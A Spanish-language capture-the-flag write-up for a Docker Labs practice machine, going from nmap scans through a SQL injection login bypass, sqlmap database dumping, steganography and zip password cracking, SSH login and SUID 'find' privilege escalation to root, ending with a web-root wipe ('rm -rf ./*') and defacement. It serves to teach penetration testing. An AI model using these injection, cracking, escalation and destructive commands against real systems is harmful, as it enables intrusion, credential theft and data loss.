![[20250820122350.png]]

# Fase de Reconocimiento 

primero empezamos con un escaneo de puertos con nmap 

```bash
nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 172.17.0.2 -oG allPorts
```

una vez sabemos los puertos que están abiertos vamos a realizar un segundo escaneo pero esta vez con scripts básicos de nmap para ver el servicio y la versión que corren por detras

```bash
nmap -p22,80 -sCV 172.17.0.2 -oN targeted
```

![[20250820114426.png]]

bien una vez que sabemos que servicios corren por detras vamos a empezar a explorar, como tiene una pagina http empezaremos por ahí

![[20250820114707.png]]

encontramos un panel de login, vamos a tratar de usar credenciales por defecto del estilo admin:admin para ver si conseguimos acceso

![[20250820114746.png]]

nos aparece un error por credenciales invalidas. vamos a probar si es vulnerable a inyecciones SQL.

```sql
'OR 1=1 -- -'
```

en la contraseña ponemos cualquier cosa

![[20250820114830.png]]

![[20250820114906.png]]

vemos que accedemos a una pagina donde podemos ver el clima de una ciudad 

![[20250820114934.png]]

no sacamos mucho de aqui pero sabemos que existe una base de datos y que a priori puede ser vulnerable así que vamos a utilizar Sqlmap para tratar de conseguir informacion

lo primero es volver al panel de login y abrir burpsuite para interceptar la petición 

![[20250820115140.png]]
yo he puesto credenciales admin:cualquiercosa realmente no importa la contraseña que pongas y siempre trataremos de apuntar al usuario admin

![[20250820115233.png]]

aqui tenemos la petición capturada con burpsuite ahora vamos a descargarla en formato txt pulsamos click derecho y la opción copy to file

![[20250820115401.png]]


lo guardamos con el nombre que queramos yo le puse request.txt 

# Fase de Explotacion 

bien empecemos con la explotacion vamos a usar sqlmap para sacar informacion de la base de datos

```bash
sqlmap -r request.txt --dbs
```

![[20250820115619.png]]

aqui pulsamos "0"

![[20250820115640.png]]

y vemos la base de datos users

```bash
sqlmap -r request.txt -D users --tables
```

ahora buscaremos tablas dentro de users

![[20250820115727.png]]

tenemos la tabla usuarios 

```bash
sqlmap -r request.txt -D users -T usuarios --dump
```

ahora veamos que hay dentro de usuarios

![[20250820115829.png]]

vale aqui vemos varios usuarios y contraseñas me llama la atención que haya un usuario directorio con la pass directoriotravieso así que veamos si realmente es un directorio oculto en el http 

![[20250820115942.png]]

vemos que existe el directorio y que contiene una imagen asi que vamos a descargarla

```bash
wget http://172.17.0.2/directoriotravieso/miramebien.jpg
```

también podéis abrir la imagen y guardarla con click derecho save image eso funciona por gustos yo prefiero acostumbrar y enseñar a usar la terminal para todo lo posible

bien vamos a descargar lo que haya dentro de la imagen usando 
```bash
steghide extract -sf miramebien.jpg
```

![[20250820120327.png]]

nos pide contraseña la cual no sabemos asi que vamos a utilizar stegcracker para tratar de romper esa contraseña

```bash
stegcracker miramebien.jpg /usr/share/wordlists/rockyou.txt
```

![[20250820120425.png]]

vemos que la password es chocolate 

volvemos a probar a sacar el contenido ahora usando la contraseña chocolate y vemos esto 

![[20250820120450.png]]

bien como es un zip usaremos 7z para tratar de descomprimirlo y sacar lo que haya dentro

```bash
7z x ocultito.zip
```

![[20250820120602.png]]

vuelve a pedir contraseña probamos la que ya sabemos chocolate y nos dice que no es correcto, nos descomprime un archivo secret.txt que esta vacío ya que sin contraseña no sirve de nada

bien pues usaremos zip2john para tratar de sacar el hash de la contraseña de el zip 

```bash
zip2john ocultito.zip > secret.hash
```

una vez tenemos el hash vamos a usar john para romperlo 

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt secret.hash
```

![[20250820120842.png]]

ahora usaremos el parametro show para ver la contraseña 

```bash 
john --show secret.hash
```

![[20250820120929.png]]

aqui tenemos la contraseña así que probamos a descomprimirlo de nuevo 

ahora vemos que si funciona con la contraseña y se descomprime un archivito secret.txt que contiene lo siguiente 

![[20250820121051.png]]

credenciales 

utilizaremos el puerto 22 SSH que estaba abierto para tratar de ingresar a la maquina victima

```bash
ssh carlos@172.17.0.2
```

![[20250820121133.png]]

vamos a exportar el TERM a xterm para trabajar mas comodos

```bash
export TERM=xterm
```

# Fase Post explotacion

vamos a ver si tenemos permisos como sudoers

```bash
sudo -l
```

![[20250820121335.png]]

vemos que no 

![[20250820121401.png]]

en el directorio principal tampoco tenemos nada 

probemos a buscar permisos SUID 

```bash
find / -perm -4000 2>/dev/null
```

![[20250820121501.png]]

aqui vemos algo muy interesante tenemos permisos SUID en el binario find. vamos a buscar en gtfobins que podemos hacer con esto 

![[20250820121555.png]]

aqui vemos una via potencial de escalar privilegios con el binario find

# Escalada de privilegios 

vamos a abusar de esos privilegios SUID que tenemos 

```bash
/usr/bin/find . -exec /bin/bash -p \; -quit
```

![[20250820121719.png]]

ahí vemos como efectivamente conseguimos escalar a root 

# Extra

como siempre en maquinas de docker labs vamos a dejar nuestra firma esta todo explicado en la maquina chocolateLovers

en resumen tenemos un html creado en nuestra maquina atacante abrimos un puerto http para desde la victima descargar y sustituir el archivo index.html del directorio /var/www/html

en la maquina victima en el directorio /var/www/html haremos 

```bash
rm -rf ./*
```

una vez esta vacía haremos lo siguiente 

![[20250820122232.png]]

una vez descargado vamos al http y recargamos la pagina 

![[20250820122303.png]]

y ahí estaría nuestra firma




